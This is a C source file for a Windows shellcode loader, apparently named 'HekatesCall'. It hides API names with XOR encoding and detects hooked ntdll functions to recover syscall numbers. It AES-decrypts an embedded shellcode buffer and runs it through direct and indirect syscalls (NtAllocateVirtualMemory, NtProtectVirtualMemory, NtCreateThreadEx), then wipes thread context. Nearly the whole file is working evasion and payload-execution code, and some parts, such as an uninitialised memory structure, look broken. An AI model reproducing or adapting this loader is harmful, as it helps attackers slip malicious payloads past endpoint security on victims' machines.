/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

*/

#include <stdio.h>
#include "__hlpFunc.h"
#include "__encStr.h"

// nasm -f win64 HekatesCall.asm -o HekatesCall.obj
// gcc -s -static -O3 -o HekatesCall HekatesCall.c HekatesCall.obj -masm=intel

wchar_t* ntDllModule() {

    // ntdll.dll
    char sNtdll[] = "\x61\x7b\x6b\x63\x63\x21\x6b\x63\x63";
    XOR_Dec(sNtdll);

    wchar_t* wNtdll = (wchar_t*) malloc(sizeof(wchar_t) * (sizeof(sNtdll)/sizeof(sNtdll[0])));
    mbstowcs(wNtdll, sNtdll, sizeof(sNtdll)/sizeof(sNtdll[0]));

    return wNtdll;
}

int findFunctionAddressAndSyscallNumber(char* input, LPBYTE hModuleStart, DWORD hModuleSize) {
    // Check if the first two characters of input are "Nt"
    if (strncmp(input, "Nt", 2) == 0) {
        // Replace "Nt" with "Zw"
        input[0] = 'Z';
        input[1] = 'w';
    }

    // Allocate space for an array offunction information
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModuleStart + ((PIMAGE_DOS_HEADER)hModuleStart)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(hModuleStart + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* addressOfFunctions = (DWORD*)(hModuleStart + exports->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)(hModuleStart + exports->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)(hModuleStart + exports->AddressOfNameOrdinals);

    FunctionInfo* functionInfoArray = (FunctionInfo*)malloc(exports->NumberOfFunctions * sizeof(FunctionInfo));
    if (functionInfoArray == NULL) {
        printf("\n[-] Failed to allocate memory\n");
        return -1;
    }

    DWORD i;
    for (i = 0; i < exports->NumberOfNames; i++) {

        // Get the name of the function
        char* functionName = (char*)(hModuleStart + addressOfNames[i]);

        // Get the address of the function
        DWORD functionAddress = (DWORD)(ULONG_PTR)(hModuleStart + addressOfFunctions[addressOfNameOrdinals[i]]);

        // Store the function name and address in the array
        functionInfoArray[i].functionName = functionName;
        functionInfoArray[i].functionAddress = functionAddress;
   }

    // Sort the array based on the function addresses
    qsort(functionInfoArray, exports->NumberOfFunctions, sizeof(FunctionInfo), compareFunctionInfo);

    // Declare a variable to keep track of the syscall number
    int syscallNumber = 0;

    // Declare a flag variable to stop the loop when the desired input is found
    int inputFound = 0;

    // Find the function address and syscall number
    for (i = 0; i < exports->NumberOfFunctions; i++) {
        if (functionInfoArray[i].functionAddress != 0 && (_strnicmp(functionInfoArray[i].functionName, "Zw", 2) == 0)) {
            // Check if the input function is found
            if (strcmp(functionInfoArray[i].functionName, input) == 0) {
                inputFound = 1;
                break;
            }
            syscallNumber++;
        }
    }

    // Free the memory used by the function information array
    free(functionInfoArray);

    if (inputFound) {
        return syscallNumber;
    } else {
        return -1;
    }
}

SyscallInfo getSyscallInfo(char* input) {
    
    SyscallInfo info = { 0 };

    HMODULE hNtDll = ModuleXtract(ntDllModule());
    if (hNtDll == NULL) {
        printf("\n[-] Error loading ntdll.dll\n");
        return info;
    }

    LPBYTE hNtDllStart = (LPBYTE)hNtDll;
    info.hNtDllEnd = hNtDllStart + ((PIMAGE_NT_HEADERS)(hNtDllStart + ((PIMAGE_DOS_HEADER)hNtDllStart)->e_lfanew))->OptionalHeader.SizeOfImage;
            
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)hNtDll + ((PIMAGE_DOS_HEADER)hNtDll)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hNtDll + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* addressOfFunctions = (DWORD*)((LPBYTE)hNtDll + exports->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((LPBYTE)hNtDll + exports->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((LPBYTE)hNtDll + exports->AddressOfNameOrdinals);
    DWORD i;
   
    for (i = 0; i < exports->NumberOfNames; i++) {
        
        DWORD nameRVA = addressOfNames[i];
        char* functionName = (char*)((LPBYTE)hNtDll + nameRVA);
        
        if (strcmp(functionName, input) == 0) {
            DWORD functionRVA = addressOfFunctions[addressOfNameOrdinals[i]];
            info.syscallNum = *((unsigned int*)(hNtDllStart + functionRVA + 4));
            unsigned int bytesSequence = *((unsigned int*)(hNtDllStart + functionRVA));

            info.functionAddress = hNtDllStart + functionRVA;
            printf("\n[+] Function %s found at 0x%p", input, info.functionAddress); // (LPVOID)GetXAddress(hNtDll, input)
            
            // Declare a flag variable to indicate if the sequence is found
            int sequenceFound = 0;

            // We're checking if the syscall is hooked

            /*  If any or all of the syscalls are hooked, 
                we can still proceed by changing the "Nt" part
                of our function to "Zw" and sorting the functions 
                based on their addresses. 

                We then associate the lowest address with syscall number 0x0, 
                followed by the next lowest address with syscall number 0x1, and so on. 
                Finally, we revert the "Zw" part of the function back to "Nt." 

                This approach ensures that we can accurately map 
                the syscalls to their respective functions, 
                regardless of whether or not they are hooked. 
            */

            if ((bytesSequence & 0xff) == 0xe9) { // this means: if the FIRST byte of bytesSequence is 0xe9
                printf("\n[!] The bytes sequence starts with 0xe9 == (PROB. HOOKED)");
                printf("\n[=] Bytes: 0x%x\n", bytesSequence);

                info.syscallNum = findFunctionAddressAndSyscallNumber(input, hNtDllStart, (DWORD)(ULONG_PTR)info.hNtDllEnd);

                // Check if the first two characters of input are "Zw"
                if (strncmp(input, "Zw", 2) == 0) {
                    // Replace "Nt" with "Zw"
                    input[0] = 'N';
                    input[1] = 't';
                }

                if (info.syscallNum != -1) {
                    printf("\n[+] Syscall number: 0x%02x\n", info.syscallNum);
                    sequenceFound = 1;
                    break;
                }
            }

            if (info.syscallNum < 0xfff) {
                printf("\n[+] Syscall number: 0x%02x\n", info.syscallNum);
            } else {
                printf("\n\n=========\n");
            }

            return info;
        }
    }

    return info;
}

LPBYTE find0f05c3Sequence(LPBYTE functionAddress, LPBYTE ntdllEnd) {
    LPBYTE p = functionAddress;
    BOOL found = FALSE;
    while (p < ntdllEnd) {
        if (*p == 0x0f && *(p + 1) == 0x05 && *(p + 2) == 0xC3) {
            found = TRUE;
            DWORD offset = (DWORD)(p - functionAddress);
            printf("[+] Found syscall instruction at 0x%p,\n[+] %d bytes from function address\n", p, offset);
            printf("\n=========\n");
            break;
        }
        p++;
    }
    if (!found) {
        printf("[-] Could not find syscall instruction, return sysInstruc()\n");
        printf("\n=========\n");
        return (LPBYTE)sysInstruc;
        BOOL found = TRUE;
    }
    return found ? p : NULL;
}

void AES_DecShell(char * payload, DWORD payload_len, unsigned char * key, DWORD keylen) {

    LPBYTE p;
    SyscallInfo info;

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    // Load the DLL
    HMODULE hAdvApi32;
    WCHAR dllPath[] = L"C:\\Windows\\System32\\advapi32.dll";
    UNICODE_STRING ustr;

    // InitXUnicodeString
    InitXUnicodeString(&ustr, dllPath);
    
    // LdrLoadDll
    XOR_Dec(sLdrLoadDll);
    info = getSyscallInfo(sLdrLoadDll);
    SysLdrLoadDll(NULL, 0, &ustr, (PHANDLE)&hAdvApi32, info.functionAddress);

    /*  These function pointers are initialized with 
        the addresses of the corresponding Windows cryptography functions via GetXAddress */

    // CryptAcquireContextW
    XOR_Dec(sCryptAcquireContextW);
    CryptAcquireContextW_t pfnCryptAcquireContextW = (CryptAcquireContextW_t)GetXAddress(hAdvApi32, sCryptAcquireContextW);

    // CryptCreateHash
    XOR_Dec(sCryptCreateHash);
    CryptCreateHash_t pfnCryptCreateHash = (CryptCreateHash_t)GetXAddress(hAdvApi32, sCryptCreateHash);

    // CryptHashData
    XOR_Dec(sCryptHashData);
    CryptHashData_t pfnCryptHashData = (CryptHashData_t)GetXAddress(hAdvApi32, sCryptHashData);

    //CryptDeriveKey
    XOR_Dec(sCryptDeriveKey);
    CryptDeriveKey_t pfnCryptDeriveKey = (CryptDeriveKey_t)GetXAddress(hAdvApi32, sCryptDeriveKey); 

    // CryptDecrypt
    XOR_Dec(sCryptDecrypt);
    CryptDecrypt_t pfnCryptDecrypt = (CryptDecrypt_t)GetXAddress(hAdvApi32, sCryptDecrypt);

    // CryptReleaseContext
    XOR_Dec(sCryptReleaseContext);
    CryptReleaseContext_t pfnCryptReleaseContext = (CryptReleaseContext_t)GetXAddress(hAdvApi32, sCryptReleaseContext); 

    // CryptDestroyHash
    XOR_Dec(sCryptDestroyHash);
    CryptDestroyHash_t pfnCryptDestroyHash = (CryptDestroyHash_t)GetXAddress(hAdvApi32, sCryptDestroyHash);

    // CryptDestroyKey
    XOR_Dec(sCryptDestroyKey);
    CryptDestroyKey_t pfnCryptDestroyKey = (CryptDestroyKey_t)GetXAddress(hAdvApi32, sCryptDestroyKey);

    /*  These function calls use the previously initialized 
        function pointers to perform a series of cryptographic operations */

    pfnCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    
    pfnCryptCreateHash(hProv, CALG_SHA_512, 0, 0, &hHash);
    pfnCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
   
    pfnCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey);
    pfnCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *)payload, &payload_len);
    
    pfnCryptReleaseContext(hProv, 0);
    pfnCryptDestroyHash(hHash);
    pfnCryptDestroyKey(hKey);

    // This function call releases the Windows cryptography library previously loaded
    
    // LdrUnloadDll
    XOR_Dec(sLdrUnloadDll);
    info = getSyscallInfo(sLdrUnloadDll);
    SysLdrUnloadDll(hAdvApi32, info.functionAddress);

}

int syscallProcess() {

    LPBYTE p;
    SyscallInfo info;

    /* =================================== SHELLCODE =================================== */

    // Shellcode bytes
    unsigned char shellcode [] = { };
    unsigned int shellcode_len = sizeof(shellcode);
    
    // Hardcoded key
    unsigned char encKey[] = { };
    DWORD keyLen = sizeof(encKey);

    // Decrypt the shellcode
    AES_DecShell((char *)shellcode, (DWORD)shellcode_len, encKey, keyLen);

    /* ====================================== END ======================================= */


    // Invoke the syscall using the obtained syscall number
    HANDLE processHandle = (HANDLE)-1;
    PVOID baseAddress = NULL;
    ULONG_PTR zeroBits = 0;
    ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
    ULONG protect = PAGE_READWRITE;

    HANDLE threads;
    DWORD oldprotect = 0;
    PVOID pVirtualAlloc = NULL;

    SIZE_T regionSize = shellcode_len;

    // NtAllocateVirtualMemory
    XOR_Dec(fNtAllocateVirtualMemory);

    // Get syscall information for the specified function
    info = getSyscallInfo(fNtAllocateVirtualMemory);

    // Find the 0x0f 0x05 0xC3 sequence within the function
    p = find0f05c3Sequence(info.functionAddress, info.hNtDllEnd);

    // Allocate memory using NtAllocateVirtualMemory
    NTSTATUS status = SysNtAllocateVirtualMemory(
        processHandle,
        &pVirtualAlloc,
        zeroBits,
        &regionSize,
        allocationType,
        protect,
        (unsigned int)info.syscallNum,
        (LPBYTE)p
    );

    if (NT_SUCCESS(status))
    {
        // Memory allocation successful, copy the shellcode to the allocated memory
        MoveXMemory(pVirtualAlloc, shellcode, shellcode_len);

        
        // SAVE the value of RDI_1 after MoveXMemory 
        /* ====================================================== */
        
        uintptr_t rdi_value;
        __asm__ volatile ("mov %0, %%rdi;" : "=r" (rdi_value));
        
        /* ====================================================== */
        

        // NtProtectVirtualMemory
        XOR_Dec(fNtProtectVirtualMemory);

        // Get syscall information for the specified function
        info = getSyscallInfo(fNtProtectVirtualMemory);

        // Find the 0x0f 0x05 0xC3 sequence within the function
        p = find0f05c3Sequence(info.functionAddress, info.hNtDllEnd);

        // Change the protection of the allocated memory to PAGE_EXECUTE_READ
        status = SysNtProtectVirtualMemory(
            processHandle,
            &pVirtualAlloc,
            (PULONG)&regionSize,
            PAGE_EXECUTE_READ,
            &oldprotect,
            (LPBYTE)movRCX,
            info.syscallNum,
            p
        );

        if (NT_SUCCESS(status))
        {
            // NtCreateThreadEx
            XOR_Dec(fNtCreateThreadEx);

            // Get syscall information for the specified function
            info = getSyscallInfo(fNtCreateThreadEx); // getSyscallInfo() changed the RDI value 


            // SAVE the value of RDI_2 after getSyscallInfo 
            /* ====================================================== */
            
            uintptr_t rdi_value_2;
            __asm__ volatile ("mov %0, %%rdi;" : "=r" (rdi_value_2));
            
            /* ====================================================== */


            // RESTORE the value of RDI_1
            /* ====================================================== */
            
            __asm__ volatile ("mov %%rdi, %0;" : : "r" (rdi_value));

            /* ====================================================== */


            // Find the 0x0f 0x05 0xC3 sequence within the function
            p = find0f05c3Sequence(info.functionAddress, info.hNtDllEnd);

            // printf("\n>> enter please."); getchar();

            // Initialize the OBJECT_ATTRIBUTES structure
            OBJECT_ATTRIBUTES objAttrs;
            InitializeObjectAttributes(&objAttrs, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

            // Create a thread to access the memory using NtCreateThreadEx
            HANDLE hThread = NULL;
            threads = SysNtCreateThreadEx(
                &hThread, 
                SYNCHRONIZE, 
                &objAttrs, 
                processHandle, 
                (LPTHREAD_START_ROUTINE)pVirtualAlloc, 
                &pVirtualAlloc, 
                FALSE, 
                zeroBits, 
                zeroBits, 
                zeroBits, 
                NULL,
                (LPBYTE)movRCX,
                // info.functionAddress,
                info.syscallNum,
                p
            );

            if (threads == NULL)
            {

                // NtWaitForSingleObject
                XOR_Dec(fNtWaitForSingleObject);

                // Get syscall information for the specified function
                info = getSyscallInfo(fNtWaitForSingleObject);

                // Find the 0x0f 0x05 0xC3 sequence within the function
                p = find0f05c3Sequence(info.functionAddress, info.hNtDllEnd);

                // Wait for the thread to finish using NtWaitForSingleObject
                LARGE_INTEGER timeout;
                timeout.QuadPart = -10000000LL;
                status = SysNtWaitForSingleObject(
                    threads, 
                    FALSE, 
                    &timeout,
                    (LPBYTE)movRCX,
                    // info.functionAddress,
                    info.syscallNum,
                    p
                );
            } 

            else if (threads != NULL) {

                /* ZEROING THE CONTEXT */

                // Get the thread's context
                WOW64_CONTEXT ctx;
                ctx.ContextFlags = CONTEXT_CONTROL;
                
                // RtlWow64GetThreadContext
                XOR_Dec(fRtlWow64GetThreadContext);
                
                // Get syscall information for the specified function
                info = getSyscallInfo(fRtlWow64GetThreadContext);
                SysRtlWow64GetThreadContext(GetTEB(), &ctx, info.functionAddress);

                LPVOID lpStartAddress = (LPVOID)ctx.Eip;

                MEMORY_BASIC_INFORMATION mbi;
                LPVOID lpMemory = SysNtProtectVirtualMemory(
                                    processHandle,
                                    mbi.BaseAddress,
                                    (PULONG)mbi.RegionSize,
                                    PAGE_READWRITE,
                                    &oldprotect,
                                    (LPBYTE)movRCX,
                                    info.syscallNum,
                                    p
                                );

                // Set the memory bytes to zero
                memset(lpMemory, 0, mbi.RegionSize);


                // RESTORE the value of RDI_2
                /* ====================================================== */
                
                __asm__ volatile ("mov %%rdi, %0;" : : "r" (rdi_value_2));

                /* ====================================================== */


                SysNtProtectVirtualMemory(
                    processHandle,
                    mbi.BaseAddress,
                    (PULONG)mbi.RegionSize,
                    PAGE_EXECUTE_READ,
                    &oldprotect,
                    (LPBYTE)movRCX,
                    info.syscallNum,
                    p
                );
            }
        }

        // NtFreeVirtualMemory
        XOR_Dec(fNtFreeVirtualMemory);

        // Get syscall information for the specified function
        info = getSyscallInfo(fNtFreeVirtualMemory);

        // Find the 0x0f 0x05 0xC3 sequence within the function
        p = find0f05c3Sequence(info.functionAddress, info.hNtDllEnd);

        // Free the allocated memory using NtFreeVirtualMemory
        status = SysNtFreeVirtualMemory(
            processHandle,
            &pVirtualAlloc,
            (PULONG)&regionSize,
            MEM_RELEASE,
            (LPBYTE)movRCX,
            // info.functionAddress,
            info.syscallNum,
            p
        );
    }

    // Close the process handle
    CloseHandle(processHandle);

    return 0;
}

int main() {

    syscallProcess();
    return 0;
}